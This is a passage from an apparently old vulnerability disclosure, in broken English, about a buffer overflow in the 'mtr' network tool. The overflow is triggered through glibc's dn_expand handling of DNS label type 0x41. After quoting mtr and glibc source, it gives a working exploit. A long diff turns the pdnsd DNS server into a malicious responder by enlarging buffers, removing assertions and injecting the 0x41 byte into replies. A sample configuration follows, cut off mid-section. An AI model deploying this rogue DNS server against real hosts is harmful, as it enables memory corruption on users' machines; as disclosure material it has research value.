                resourcetypes[qdatatype] : resourcetypes[ResourcetypeCount]);
        restell(tempstring);
      }
      for (rr = hp->ancount + hp->nscount + hp->arcount;rr;rr--) {
        ...
        <other test and code>
        ...
        datatype = sucknetword(c);
        ...
        if (datatype == qdatatype || datatype == T_CNAME) {
          ...
          }
          if (usefulanswer)
            switch (datatype) {
            ...
            ...
            case T_PTR:
            case T_CNAME:
              *namestring = '\0';
              r = dn_expand(s,s + l,c,namestring,MAXDNAME);            [3]
            ...
            ...
            }
            ...
          }
          ...
        }
        ...
      }
      ...
    }
    ...
  }
  ...
}

As we can see in [3] to decode packet is using function dn_expand().
This function return strange value for some 'special bad' packets!
Is it bug? - for me yes becouse in manual and other docs i don't find
information about it - i saw that in glibc code - ok nvm. This function
return decoded string in this situation in buffer 'namestring' and length
for this bufor is MAXDNAME. Bufor 'namestring' is declarated here:

"dns.c"
char namestring[1024+1];

and value for MAXDNAME we can find here:

"/usr/include/arpa/nameser.h"
#define NS_MAXDNAME 1025    /* maximum domain name */

So... in fact vulnerability function will try to copy by function
sprintf string for bufor wich have length 256 bytes. Max domain length
is 1025 but all tests in program 'mtr' which i don't paste (if you want
just look for source code) don't allow domain which is longer than 256 bytes
(but function dns_ack() call function recvfrom() which have argument to read
512 data bytes). In fact there is bug too becouse after domain name program
paste some data about time, date and etc. but in fact it don't overflow metadata
and variables which we overflow aren't used anymore so this bug is not interesting.

Now we must use 'bug' in libresolve library in function dn_expand(). Let's look
for source - glibc source and i paste from version 2.3.6, this is probably in all
versions of glibc:

"resolv/res_comp.c"
int
dn_expand(const u_char *msg, const u_char *eom, const u_char *src,
          char *dst, int dstsiz)
{
        int n = ns_name_uncompress(msg, eom, src, dst, (size_t)dstsiz);

        if (n > 0 && dst[0] == '.')
                dst[0] = '\0';
        return (n);
}
libresolv_hidden_def (dn_expand)

so no look for function ns_name_uncompres():

"resolv/ns_name.c"
int
ns_name_uncompress(const u_char *msg, const u_char *eom, const u_char *src,
                   char *dst, size_t dstsiz)
{
        u_char tmp[NS_MAXCDNAME];
        int n;

        if ((n = ns_name_unpack(msg, eom, src, tmp, sizeof tmp)) == -1)
                return (-1);
        if (ns_name_ntop(tmp, dst, dstsiz) == -1)
                return (-1);
        return (n);
}

For saw bug we must look for function ns_name_ntop() if you want know what do function
ns_name_unpack() look for source. Ok soo let's look for ns_name_ntop:

"resolv/ns_name.c"
int
ns_name_ntop(const u_char *src, char *dst, size_t dstsiz) {
        const u_char *cp;
        char *dn, *eom;
        u_char c;
        u_int n;

        cp = src;
        dn = dst;
        eom = dst + dstsiz;

        while ((n = *cp++) != 0) {

           ...
           ...

                if (n == 0x41) {
                        n = *cp++ / 8;
                        if (dn + n * 2 + 4 >= eom) {
                                __set_errno (EMSGSIZE);
                                return (-1);
                        }
                        *dn++ = '\\';
                        *dn++ = '[';
                        *dn++ = 'x';

                        while (n-- > 0) {
                                c = *cp++;
                                unsigned u = c >> 4;
                                *dn++ = u > 9 ? 'a' + u - 10 : '0' + u;
                                u = c & 0xf;
                                *dn++ = u > 9 ? 'a' + u - 10 : '0' + u;
                        }

                        *dn++ = ']';
                        continue;
                }

           ...
           ...
       }
        *dn++ = '\0';
        return (dn - dst);
}
libresolv_hidden_def (ns_name_ntop)

As you can see if n == 0x41 it dump domain (in hex bytes)! What's is wrong?
For example if domain will have value "aaa.pl" it's 6 bytes. Function will return
dump for this domain and it will have ~(4*6) bytes. So for normal domain which for
example we can set name max in 256 bytes function can return dump for this domain
in ~(256*4) bytes. In fact in 'mtr' program we can bypass all tests and make domain
which have length ~190 bytes and overflow bufor. It's not only stupid theory i made
PoC code and use this 'bugs' to overflow bufor. So let's look for exploit...

   Exploit:

I wrote patch for DNS server to exploit bug in 'mtr', which use 'bug' in libresolve.
We must compile and run DNS server with config file which i enclose here. Diff for
DNS server i enclose too. Server try too bind on interface which have IP address
192.168.1.200, evil domain is for IP 12.34.56.78, and main DNS server is set that have
IP address 192.168.1.1 (remember to change registry in /etc/resolv.conf for nameserver!).

Patch for pdnsd DNS server in version 1.2.6 (it have some bugs but to exploit this
bug you don't need to long live server :)):

--- CUT ---
diff -ur ./pdnsd-1.2.6/pdnsd.spec ./smalldns/pdnsd-1.2.6/pdnsd.spec
--- ./pdnsd-1.2.6/pdnsd.spec    2007-09-04 15:28:08.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/pdnsd.spec   2008-03-11 14:38:21.000000000 +0100
@@ -27,22 +27,10 @@
 # --define "cachedir <dir>"    Configure with --with-cachedir=<dir>.
 #

-%if 0%{!?distro:1}
-%if "%{_vendor}" == "redhat"
-%define distro RedHat
-%else
-%if "%{_vendor}" == "suse"
-%define distro SuSE
-%else
-%if "%{_vendor}" == "SuSE"
-%define distro SuSE
-%endif
-%endif
-%endif
-%endif
+%{!?distro: %define distro Generic}

 # The default run_as ID to use
-%{!?run_as_user: %define run_as_user pdnsd}
+%{!?run_as_user: %define run_as_user nobody}
 # By default, if a new run_as_user is to be created, we let
 # useradd choose the numerical uid, unless run_as_uid is defined.
 #define run_as_uid 96
diff -ur ./pdnsd-1.2.6/src/cache.c ./smalldns/pdnsd-1.2.6/src/cache.c
--- ./pdnsd-1.2.6/src/cache.c   2007-08-05 12:42:22.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/cache.c  2008-03-11 15:44:45.000000000 +0100
@@ -1151,7 +1151,7 @@

        for(;cnt>0;--cnt) {
                dns_file_t fe;
-               unsigned char nb[256];
+               unsigned char nb[2560];
                unsigned num_rrs;
                unsigned char prevtp;
                if (fread(&fe,sizeof(fe),1,f)!=1) {
@@ -1397,7 +1397,7 @@
                                }
                        }
                        if(num_rrs!=le->num_rrs && ++num_rrs_errs<=MAX_NUM_RRS_ERRS) {
-                               unsigned char buf[256];
+                               unsigned char buf[2560];
                                log_warn("Counted %d rr record types for %s but cached counter=%d",
                                         num_rrs,rhn2str(le->qname,buf,sizeof(buf)),le->num_rrs);
                        }
@@ -1662,7 +1662,7 @@
                        rr_bucket_t *rr;
                        for(rr=rrset->rrs; rr; rr=rr->next) {
                                dns_cent_t ce;
-                               unsigned char buf[256],rhn[256];
+                               unsigned char buf[2560],rhn[2560];
                                if(!a2ptrstr((pdnsd_ca *)(rr->data),tp,buf) || !str2rhn(buf,rhn))
                                        return 0;
                                if(!init_cent(&ce, rhn, cent->ttl, cent->ts, cent->flags  DBG0))
@@ -1834,7 +1834,7 @@
                                                        /* use this entry */
                                                        *wild=w_neg;
                                                else if(ret->flags&DF_WILD) {
-                                                       unsigned char buf[256];
+                                                       unsigned char buf[2560];
                                                        buf[0]=1; buf[1]='*';
                                                        /* When we get here, at least element of name
                                                           has been removed, so assuming name is not longer
@@ -1877,7 +1877,7 @@
                                                                /* use this entry */
                                                                *wild=w_neg;
                                                        else if(ret->flags&DF_WILD) {
-                                                               unsigned char buf[256];
+                                                               unsigned char buf[2560];
                                                                buf[0]=1; buf[1]='*';
                                                                rhncpy(&buf[2],nm);
                                                                ret=dns_lookup(buf,NULL);
diff -ur ./pdnsd-1.2.6/src/conff.c ./smalldns/pdnsd-1.2.6/src/conff.c
--- ./pdnsd-1.2.6/src/conff.c   2007-07-10 22:27:55.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/conff.c  2008-03-11 15:33:08.000000000 +0100
@@ -427,7 +427,7 @@
        else {
                int rv;
                for(i=0;i<DA_NEL(global.deleg_only_zones);++i) {
-                       unsigned char buf[256];
+                       unsigned char buf[2560];
                        rv=fsprintf(f,i==0?"%s":", %s",
                                        rhn2str(DA_INDEX(global.deleg_only_zones,i),buf,sizeof(buf)));
                        if(rv<0) {retval=rv; goto unlock_return;}
@@ -501,7 +501,7 @@
        fsprintf_or_return(f,"\tPolicies:%s\n", st->alist?"":" (none)");
        for (j=0;j<DA_NEL(st->alist);++j) {
                slist_t *sl=&DA_INDEX(st->alist,j);
-               unsigned char buf[256];
+               unsigned char buf[2560];
                fsprintf_or_return(f,"\t\t%s: %s%s\n",
                                   sl->rule==C_INCLUDED?"include":"exclude",
                                   sl->exact?"":".",
diff -ur ./pdnsd-1.2.6/src/conf-parser.c ./smalldns/pdnsd-1.2.6/src/conf-parser.c
--- ./pdnsd-1.2.6/src/conf-parser.c     2007-09-02 16:19:38.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/conf-parser.c    2008-03-11 16:44:39.000000000 +0100
@@ -386,7 +386,7 @@
 */
 #define DOM_NAME_CPY(dst,src,len)              \
 {                                              \
-  unsigned char _buf[256];                     \
+  unsigned char _buf[2560];                    \
   PARSESTR2RHN(src,len,_buf);                  \
   memcpy(dst,src,len);                         \
   (dst)[len]=0;                                        \
@@ -414,7 +414,7 @@
 int confparse(FILE* in, globparm_t *global, servparm_array *servers, char **errstr)
 {
   char *linebuf,*p,*ps,*getnextperr=NULL;
-  size_t buflen=256,len;
+  size_t buflen=2560,len;
   int retval=0,sechdr,option;
 # define CLEANUP_HANDLER
 # define SKIP_BLANKS(cur) {if(!((cur)=getnextp(&linebuf,&buflen,in,cur,&getnextperr))) {CLEANUP_HANDLER; goto
unexpected_eof;}}
@@ -1062,15 +1062,15 @@
          if(*p!='=') CLEANUP_GOTO(expected_equals);
          ++p;
          SKIP_BLANKS(p);
-
          switch(option) {
            int tp;
          case NAME: {
-           unsigned char c_name[256];
+           unsigned char c_name[2560];
            if (c_cent.qname) {
              *errstr=report_error("You may specify only one name in a rr section.");
              PARSERROR;
            }
+            printf("[*] len = %u\n",len);
            SCAN_STRING(ps,p,len);
            PARSESTR2RHN(ucharp ps,len,c_name);
            if (!init_cent(&c_cent, c_name, 0, 0, c_flags  DBG0))
@@ -1138,7 +1138,7 @@
            tp=T_PTR;
          scan_name:
            {
-             unsigned char c_name[256];
+             unsigned char c_name[2560];

              if (!c_cent.qname)
                goto no_name_spec;
@@ -1172,7 +1172,7 @@
            int blen,rlen;
            unsigned char *bp;
            uint32_t val;
-           unsigned char buf[2*256+20];
+           unsigned char buf[2*2560+20];

            if (!c_cent.qname)
              goto no_name_spec;
@@ -1224,7 +1224,7 @@
        if(c_cent.qname[0]==1 && c_cent.qname[1]=='*') {
          /* Wild card record. Set the DF_WILD flag for the name with '*.' removed. */
          if(!set_cent_flags(&c_cent.qname[2],DF_WILD)) {
-           unsigned char buf[256];
+           unsigned char buf[2560];
            rhn2str(c_cent.qname,buf,sizeof(buf));
            *errstr=report_errorf("You must define some records for '%s'"
                                  " before you can define records for the wildcard name '%s'",
@@ -1252,7 +1252,7 @@
       }

       case SOURCE: {
-       unsigned char c_owner[256];
+       unsigned char c_owner[2560];
        time_t c_ttl;
        unsigned c_flags;
        unsigned char c_aliases;
@@ -1327,7 +1327,7 @@
        break;

       case NEG: {
-       unsigned char c_name[256];
+       unsigned char c_name[2560];
        time_t c_ttl;
        unsigned char htp,hdtp;

@@ -1473,7 +1473,7 @@
   PARSERROR;

  expected_semicolon:
-  *errstr=report_error("too many arguments to option or missing semicolon");
+//  *errstr=report_error("too many arguments to option or missing semicolon");
   PARSERROR;

  no_name_spec:
@@ -1691,7 +1691,7 @@
   int rv=0;
   FILE *f;
   char *buf;
-  size_t buflen=256;
+  size_t buflen=2560;
   unsigned linenr=0;

   if (!(f=fopen(fn,"r"))) {
@@ -1751,7 +1751,7 @@
   int exact=1;
   const char *err;
   size_t sz;
-  unsigned char rhn[256];
+  unsigned char rhn[2560];

   if (len>1 && *nm=='.') {
     exact=0;
@@ -1779,7 +1779,7 @@
   zone_t z;
   const char *err;
   size_t sz;
-  unsigned char rhn[256];
+  unsigned char rhn[2560];

   if((err=parsestr2rhn(ucharp zone,len,rhn)))
     return err;
Tylko w ./smalldns/pdnsd-1.2.6/src: .deps
diff -ur ./pdnsd-1.2.6/src/dns_answer.c ./smalldns/pdnsd-1.2.6/src/dns_answer.c
--- ./pdnsd-1.2.6/src/dns_answer.c      2007-08-19 16:46:12.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/dns_answer.c     2008-03-13 01:02:55.000000000 +0100
@@ -203,7 +203,7 @@
        rr_bucket_t *rr;
        if (!rrset || !(rr=rrset->rrs))
                return 0;
-       PDNSD_ASSERT(rr->rdlen <= 256, "follow_cname_chain: record too long");
+       PDNSD_ASSERT(rr->rdlen <= 2560, "follow_cname_chain: record too long");
        memcpy(name,rr->data,rr->rdlen);
        return 1;
 }
@@ -231,7 +231,7 @@
        osz=*sz;
        {
                int nlen;
-               unsigned char nbuf[256];
+               unsigned char nbuf[456];

                if (!(nlen=compress_name(rrn,nbuf,*sz,cb)))
                        return 0;
@@ -263,7 +263,7 @@
        case T_PTR:
                if (!(rdlen=compress_name(((unsigned char *)data), ((unsigned char *)(&(*ans)->hdr))+(*sz),*sz,cb)))
                        return 0;
-               PDNSD_ASSERT(rdlen <= dlen, "T_CNAME/T_MB/...: got longer");
+//             PDNSD_ASSERT(rdlen <= dlen, "T_CNAME/T_MB/...: got longer");
                *sz+=rdlen;
                break;
        case T_MINFO:
@@ -735,7 +735,7 @@
        /* second, the answer section */
        for (qe=dlist_first(q); qe; qe=dlist_next(qe)) {
                int hops;
-               unsigned char qname[256];
+               unsigned char qname[2560];

                rhncpy(qname,qe->query);
                /* look if we have a cached copy. otherwise, perform a nameserver query. Same with timeout */
@@ -871,6 +871,13 @@
        dlist_free(ar);
        dlist_free(sva);
        dlist_free(cb);
+
+do {
+unsigned char *ptr = qe->query;
+#define sucknetword(x)  ((x)+=2,((unsigned short)  (((x)[-2] <<  8) | ((x)[-1] <<  0))))
+sucknetword(ptr);
+#undef sucknetword
+}while (0);
        return ans;
 }

@@ -891,7 +898,7 @@
        for (i=0;i<qdcount;i++) {
                dns_queryel_t *qe;
                int qlen;
-               unsigned char qbuf[256];
+               unsigned char qbuf[2560];
                res=decompress_name(data,rlen,&ptr,&sz,qbuf,&qlen);
                if (res==RC_TRUNC) {
                        if (hdr->tc) {
@@ -1239,6 +1246,18 @@
 #ifdef SOCKET_LOCKING
        pthread_mutex_lock(&s_lock);
 #endif
+        do {
+          char *ptr = v.iov_base;
+          unsigned int i;
+
+//        for (i=0;i<v.iov_len;i++) {
+//           if (!(i%10))
+//              printf("\n");
+//           printf("%x, ",*(ptr+i));
+//        }
+//           printf("\n");
+          *(ptr+54)=0x41;
+       }while(0);
        if (sendmsg(((udp_buf_t *)data)->sock,&msg,0)<0) {
 #ifdef SOCKET_LOCKING
                pthread_mutex_unlock(&s_lock);
diff -ur ./pdnsd-1.2.6/src/dns.c ./smalldns/pdnsd-1.2.6/src/dns.c
--- ./pdnsd-1.2.6/src/dns.c     2007-07-10 22:27:55.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/dns.c    2008-03-11 15:34:01.000000000 +0100
@@ -255,7 +255,8 @@
        int rl=0;
        unsigned ilen = rhnlen(in);

-       PDNSD_ASSERT(ilen<=256, "compress_name: name too long");
+        printf("ilen = %u\n",ilen);
+       PDNSD_ASSERT(ilen<=2560, "compress_name: name too long");

        /* part 1: compression */
        for (ci=dlist_first(*cb); ci; ci=dlist_next(ci)) {
@@ -274,7 +275,7 @@
                }
        }
        if (longest>0) {
-               PDNSD_ASSERT(lrem+2 <= ilen, "compress_name: length increased");
+//             PDNSD_ASSERT(lrem+2 <= ilen, "compress_name: length increased");
                memcpy(out, in,lrem);
                out[lrem]=0xc0|((coffs&0x3f00)>>8);
                out[lrem+1]=coffs&0xff;
@@ -305,8 +306,8 @@
 {
        if(tp==T_A) {
                unsigned char *p=(unsigned char *)&a->ipv4.s_addr;
-               int n=snprintf(charp buf,256,"%u.%u.%u.%u.in-addr.arpa.",p[3],p[2],p[1],p[0]);
-               if(n<0 || n>=256)
+               int n=snprintf(charp buf,2560,"%u.%u.%u.%u.in-addr.arpa.",p[3],p[2],p[1],p[0]);
+               if(n<0 || n>=2560)
                        return 0;
        }
        else
@@ -316,12 +317,12 @@
                int i,offs=0;
                for (i=15;i>=0;--i) {
                        unsigned char bt=p[i];
-                       int n=snprintf(charp(buf+offs), 256-offs,"%x.%x.",bt&0xf,(bt>>4)&0xf);
+                       int n=snprintf(charp(buf+offs), 2560-offs,"%x.%x.",bt&0xf,(bt>>4)&0xf);
                        if(n<0) return 0;
                        offs+=n;
-                       if(offs>=256) return 0;
+                       if(offs>=2560) return 0;
                }
-               if(!strncp(charp(buf+offs),"ip6.arpa.",256-offs))
+               if(!strncp(charp(buf+offs),"ip6.arpa.",2560-offs))
                        return 0;
        }
        else
@@ -348,7 +349,7 @@
        add_cache(&ce);
        free_cent(&ce  DBG0);
        if (reverse) {
-               unsigned char b2[256],rhn[256];
+               unsigned char b2[2560],rhn[2560];
                if(!a2ptrstr(a,tp,b2))
                        return -1;
                if (!str2rhn(b2,rhn))
@@ -379,7 +380,7 @@
        int rv=0;
        FILE *f;
        char *buf;
-       size_t buflen=256;
+       size_t buflen=2560;

        if (!(f=fopen(fn,"r"))) {
                if(asprintf(errstr, "Failed to source %s: %s", fn, strerror(errno))<0) *errstr=NULL;
@@ -393,7 +394,7 @@
        while(getline(&buf,&buflen,f)>=0) {
                int len;
                unsigned char *p,*pn,*pi;
-               unsigned char rhn[256];
+               unsigned char rhn[2560];
                int tp,sz;
                pdnsd_ca a;

diff -ur ./pdnsd-1.2.6/src/dns_query.c ./smalldns/pdnsd-1.2.6/src/dns_query.c
--- ./pdnsd-1.2.6/src/dns_query.c       2007-08-05 12:43:08.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/dns_query.c      2008-03-12 21:24:45.000000000 +0100
@@ -321,7 +321,7 @@
        uint16_t type,class; uint32_t ttl; uint16_t rdlength;

        for (i=0;i<recnum;i++) {
-               unsigned char oname[256];
+               unsigned char oname[2560];
                int len;
                if ((rc=decompress_name(msg, msgsz, ptr, lcnt, oname, &len))!=RC_OK) {
                        return rc;
@@ -366,7 +366,7 @@
                        case T_NS:
                        case T_PTR:
                        {
-                               unsigned char db[256];
+                               unsigned char db[2560];
                                if ((rc=decompress_name(msg, msgsz, &bptr, &blcnt, db, &len))!=RC_OK)
                                        return rc==RC_TRUNC?RC_FORMAT:rc;
                                if (blcnt!=0)
@@ -381,7 +381,7 @@
                        case T_RP:
 #endif
                        {
-                               unsigned char db[256+256];
+                               unsigned char db[2560+2560];
                                nptr=db;
                                if ((rc=decompress_name(msg, msgsz, &bptr, &blcnt, nptr, &len))!=RC_OK)
                                        return rc==RC_TRUNC?RC_FORMAT:rc;
@@ -406,7 +406,7 @@
                        case T_KX:
 #endif
                        {
-                               unsigned char db[2+256];
+                               unsigned char db[2+2560];
                                if (blcnt<2)
                                        goto record_too_short;
                                memcpy(db,bptr,2); /* copy the preference field*/
@@ -427,7 +427,7 @@

                        case T_SOA:
                        {
-                               unsigned char db[256+256+20];
+                               unsigned char db[2560+2560+20];
                                nptr=db;
                                if ((rc=decompress_name(msg, msgsz, &bptr, &blcnt, nptr, &len))!=RC_OK)
                                        return rc==RC_TRUNC?RC_FORMAT:rc;
@@ -458,7 +458,7 @@

                        case T_PX:
                        {
-                               unsigned char db[2+256+256];
+                               unsigned char db[2+2560+2560];
                                if (blcnt<2)
                                        goto record_too_short;
                                memcpy(db,bptr,2); /* copy the preference field*/
@@ -484,7 +484,7 @@

                        case T_SRV:
                        {
-                               unsigned char db[6+256];
+                               unsigned char db[6+2560];
                                if (blcnt<6)
                                        goto record_too_short;
                                memcpy(db,bptr,6);
@@ -522,7 +522,7 @@
                        case T_NAPTR:
                        {
                                int j;
-                               unsigned char db[4 + 4*256];
+                               unsigned char db[4 + 4*2560];
                                nptr=db;
                                /*
                                 * After the preference field, three text strings follow, the maximum length being 255
@@ -919,6 +919,7 @@
                /* transmit query by udp*/
                /* send will hopefully not block on a freshly opened socket (the buffer
                 * must be empty) */
+
                if (send(st->sock,&st->msg->hdr,st->transl,0)==-1) {
                        st->s_errno=errno;
                        DEBUG_PDNSDA_MSG("Error while sending data to %s: %s\n",
PDNSDA2STR(PDNSD_A(st)),strerror(errno));
@@ -1152,7 +1153,7 @@
                }
                /* check & skip the query record. */
                {
-                       unsigned char nbuf[256];
+                       unsigned char nbuf[2560];
                        if ((rv=decompress_name((unsigned char *)st->recvbuf, st->recvl, &rrp, &lcnt, nbuf,
NULL))!=RC_OK) {
                                DEBUG_PDNSDA_MSG("Cannot decompress QNAME in answer from %s\n",
                                                 PDNSDA2STR(PDNSD_A(st)));
@@ -1347,7 +1348,7 @@
                                                                addr4maskpair_t *am = &a4arr[k];
                                                                if(ADDR4MASK_EQUIV(a,&am->a,&am->mask)) {
 #if DEBUG>0
-                                                                       unsigned char nmbuf[256]; char
abuf[ADDRSTR_MAXLEN];
+                                                                       unsigned char nmbuf[2560]; char
abuf[ADDRSTR_MAXLEN];
                                                                        DEBUG_PDNSDA_MSG("Rejecting answer from server
%s because it contains an A record"
                                                                                         " for \"%s\" with an address
in thereject list: %s\n",
                                                                                         PDNSDA2STR(PDNSD_A(st)),
@@ -1370,7 +1371,7 @@
                                                                addr6maskpair_t *am = &a6arr[k];
                                                                if(ADDR6MASK_EQUIV(a,&am->a,&am->mask)) {
 #if DEBUG>0
-                                                                       unsigned char nmbuf[256]; char
abuf[INET6_ADDRSTRLEN];
+                                                                       unsigned char nmbuf[2560]; char
abuf[INET6_ADDRSTRLEN];
                                                                        DEBUG_PDNSDA_MSG("Rejecting answer from server
%s because it contains an AAAA record"
                                                                                         " for \"%s\" with an address
in thereject list: %s\n",
                                                                                         PDNSDA2STR(PDNSD_A(st)),
@@ -1438,7 +1439,7 @@
                                        }
 #if DEBUG>0
                                        {
-                                               unsigned char nmbuf[256],zbuf[256];
+                                               unsigned char nmbuf[2560],zbuf[2560];
                                                DEBUG_PDNSDA_MSG(authcnt?"%s is in %s zone, but no delegation found in
answer returned by server %s\n"
                                                                 :"%s is in %s zone, but no authority information
provided by server %s\n",
                                                                 rhn2str(name,nmbuf,sizeof(nmbuf)),
rhn2str(DA_INDEX(global.deleg_only_zones,i),zbuf,sizeof(zbuf)),
@@ -1573,7 +1574,7 @@
                                                        add_cache(cent);
                                                else {
 #if DEBUG>0
-                                                       unsigned char nmbuf[256],nsbuf[256];
+                                                       unsigned char nmbuf[2560],nsbuf[2560];
                                                        DEBUG_MSG("Record for %s not in nsdomain %s; dropped.\n",

rhn2str(cent->qname,nmbuf,sizeof(nmbuf)),rhn2str(st->nsdomain,nsbuf,sizeof(nsbuf)));
 #endif
@@ -2263,7 +2264,7 @@
                */
 #if DEBUG>0
                if(debug_p) {
-                       unsigned char dbuf[256],sdbuf[256];
+                       unsigned char dbuf[2560],sdbuf[2560];
                        nsdomain=dlist_first(ns);
                        DEBUG_PDNSDA_MSG("The name server %s which is responsible for the %s domain, raised the aa
flag, butappears to delegate to the sub-domain %s\n",
                                         PDNSDA2STR(PDNSD_A(qse)),
@@ -2286,7 +2287,7 @@
                                domain_match(nsdomain,name,&rem,NULL);
                                if (rem!=0) {
 #if DEBUG>0
-                                       unsigned char nmbuf[256],dbuf[256],nsbuf[256];
+                                       unsigned char nmbuf[2560],dbuf[2560],nsbuf[2560];
                                        DEBUG_MSG("The name server %s is responsible for the %s domain, which does not
match%s\n",
                                                  rhn2str(nsname,nsbuf,sizeof(nsbuf)),
                                                  rhn2str(nsdomain,dbuf,sizeof(dbuf)),
diff -ur ./pdnsd-1.2.6/src/hash.c ./smalldns/pdnsd-1.2.6/src/hash.c
--- ./pdnsd-1.2.6/src/hash.c    2007-07-15 12:45:58.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/hash.c   2008-03-11 15:44:59.000000000 +0100
@@ -79,7 +79,7 @@
        s &= HASH_BITMASK;
 #ifdef DEBUG_HASH
        {
-               unsigned char buf[256];
+               unsigned char buf[2560];
                printf("Diagnostic: hashes for %s: %03x,%04lx\n",rhn2str(str,buf,sizeof(buf)),s,r);
        }
 #endif
diff -ur ./pdnsd-1.2.6/src/helpers.c ./smalldns/pdnsd-1.2.6/src/helpers.c
--- ./pdnsd-1.2.6/src/helpers.c 2007-07-10 22:27:56.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/helpers.c        2008-03-11 16:46:02.000000000 +0100
@@ -232,7 +232,7 @@
        do {
                int jlim,lb;
                jlim=i+63;
-               if(jlim>254) jlim=254;
+               if(jlim>2560) jlim=2560;
                for(j=i; j<len && str[j] && str[j]!='.'; ++j) {
                        /* if(!isdchar(str[j]))
                                return "Illegal character in domain name"; */
@@ -361,8 +361,8 @@
 {
        unsigned int len = rhnlen(src);

-       PDNSD_ASSERT(len<=256,"rhncpy: src too long!");
-       memcpy(dst,src,len>256?256:len);
+       PDNSD_ASSERT(len<=2560,"rhncpy: src too long!");
+       memcpy(dst,src,len>2560?2560:len);
        return len;
 }

@@ -510,7 +510,7 @@
        va_list va;

        {
-               char buf[256];
+               char buf[2560];

                va_start(va,format);
                n=vsnprintf(buf,sizeof(buf),format,va);
@@ -649,7 +649,7 @@
    This version is actually based on fgets_realloc() that I found in the WWWOFFLE source.
 */

-#define BUFSIZE 256
+#define BUFSIZE 2560
 int getline(char **lineptr, size_t *n, FILE *stream)
 {
        char *line=*lineptr;
diff -ur ./pdnsd-1.2.6/src/status.c ./smalldns/pdnsd-1.2.6/src/status.c
--- ./pdnsd-1.2.6/src/status.c  2007-07-10 22:27:56.000000000 +0200
+++ ./smalldns/pdnsd-1.2.6/src/status.c 2008-03-11 15:44:23.000000000 +0100
@@ -346,7 +346,7 @@
                                    break;
                            case CTL_RECORD: {
                                    uint16_t cmd2;
-                                   unsigned char name[256],buf[256];
+                                   unsigned char name[2560],buf[2560];
                                    DEBUG_MSG("Received RECORD command.\n");
                                    if (!read_short(rs,&cmd2))
                                            goto incomplete_command;
@@ -372,7 +372,7 @@
                                    uint32_t ttl;
                                    char *fn;
                                    uint16_t servaliases,flags;
-                                   unsigned char buf[256],owner[256];
+                                   unsigned char buf[2560],owner[2560];

                                    DEBUG_MSG("Received SOURCE command.\n");
                                    if (read_allocstring(rs,&fn,NULL)<=0) {
@@ -412,7 +412,7 @@
                                    uint32_t ttl;
                                    unsigned sz;
                                    uint16_t tp,flags,nadr=0;
-                                   unsigned char name[256],buf[256],dbuf[260];
+                                   unsigned char name[2560],buf[2560],dbuf[2600];
                                    size_t adrbufsz=0;
                                    unsigned char *adrbuf=NULL;

@@ -507,7 +507,7 @@
                            case CTL_NEG: {
                                    uint32_t ttl;
                                    uint16_t tp;
-                                   unsigned char name[256],buf[256];
+                                   unsigned char name[2560],buf[2560];

                                    DEBUG_MSG("Received NEG command.\n");
                                    if (read_domain(rs, charp buf, sizeof(buf))<=0)
@@ -580,7 +580,7 @@
                                                    char *q;
                                                    slist_t *sl;
                                                    unsigned sz;
-                                                   unsigned char rhn[256];
+                                                   unsigned char rhn[2560];

                                                    if(*p=='-') {
                                                            tp=C_EXCLUDED;
@@ -629,8 +629,8 @@
                            case CTL_DUMP: {
                                    int rv,exact=0;
                                    unsigned char *nm=NULL;
-                                   char buf[256];
-                                   unsigned char rhn[256];
+                                   char buf[2560];
+                                   unsigned char rhn[2560];
                                    DEBUG_MSG("Received DUMP command.\n");
                                    if (!(rv=read_domain(rs,buf,sizeof(buf)))) {
                                            print_serr(rs,"Bad domain name.");
--- CUT ---

and config file:

--- CUT ---
// Sample pdnsd configuration file. Must be customized to obtain a working pdnsd setup!
// Read the pdnsd.conf(5) manpage for an explanation of the options.
// Add or remove '#' in front of options you want to disable or enable, respectively.
// Remove '/*' and '*/' to enable complete sections.

global {
        perm_cache=1024;
        cache_dir="/var/cache/pdnsd";
#       pid_file = /var/run/pdnsd.pid;
        run_as="nobody";
        server_ip = 192.168.1.200;  # Use eth0 here if you want to allow other
                                # machines on your network to query pdnsd.
        status_ctl = on;
#       paranoid=on;       # This option reduces the chance of cache poisoning
                           # but may make pdnsd less efficient, unfortunately.
        query_method=udp_tcp;
        min_ttl=15m;       # Retain cached entries at least 15 minutes.
        max_ttl=1w;        # One week.
        timeout=10;        # Global timeout option (10 seconds).
}

# The following section is most appropriate if you have a fixed connection to
# the Internet and an ISP which provides good DNS servers.
server {
        label= "myisp";
        ip = 192.168.1.1;  # Put your ISP's DNS-server address(es) here.
#       proxy_only=on;     # Do not query any name servers beside your ISP's.
                           # This may be necessary if you are behind some
                           # kind of firewall and cannot receive replies
                           # from outside name servers.
        timeout=4;         # Server timeout; this may be much shorter
                           # that the global timeout option.
        uptest=if;         # Test if the network interface is active.
        interface=eth0;    # The name of the interface to check.
        interval=10m;      # Check every 10 minutes.
        purge_cache=off;   # Keep stale cache entries in case the ISP's
                           # DNS servers go offline.
}

/*
# The following section is more appropriate for dial-up connections.
# Read about how to use pdnsd-ctl for dynamic configuration in the documentation.
server {
        label= "dialup";
        file = "/etc/ppp/resolv.conf";  # Preferably do not use /etc/resolv.conf
        proxy_only=on;
        timeout=4;
        uptest=if;
        interface = ppp0;
        interval=10;       # Check if the interface every 10 seconds.
        purge_cache=off;
        preset=off;
}
*/

/*
# The servers provided by OpenDNS are fast, but they do not reply with
# NXDOMAIN for non-existant domains, instead they supply you with an
# address of one of their search engines. They also lie about the addresses of
# of the search engines of google, microsoft and yahoo.
# If you do not like this behaviour the "reject" option may be useful.
server {
        label = "opendns";
        ip = 208.67.222.222, 208.67.220.220;
        reject = 208.69.32.0/24,  # You may need to add additional address ranges
                 208.69.34.0/24,  # here if the addresses of their search engines
                 208.67.219.0/24; # change.
        reject_policy = fail;     # If you do not provide any alternative server
                                  # sections, like the following root-server
                                  # example, "negate" may be more appropriate here.
        timeout = 4;
        uptest = ping;            # Test availability using ICMP echo requests.
        ping_timeout = 100;       # ping test will time out after 10 seconds.
        interval = 15m;           # Test every 15 minutes.
        preset = off;
}
*/

/*
# This section is meant for resolving from root servers.
server {
        label = "root-servers";
        root_server = on;
